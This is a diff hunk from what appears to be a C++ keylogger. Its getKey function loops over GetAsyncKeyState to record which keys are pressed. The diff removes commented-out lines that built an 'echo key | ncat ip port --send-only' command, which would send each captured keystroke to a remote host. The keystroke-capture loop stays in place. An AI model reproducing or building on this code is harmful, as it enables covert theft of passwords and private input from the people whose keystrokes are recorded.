@@ -10,12 +10,8 @@
 
 int i = 1;
 int getKey(){
-
     while(true){
         if(GetAsyncKeyState(i) == -32768){
-            //stringstream txt ;
-            //cout << i << "\n";
-            //txt << "echo " << i << " | " << "ncat " << ip << " " << port << " --send-only";
             int cp = i;
             i++;
 			char c = cp;
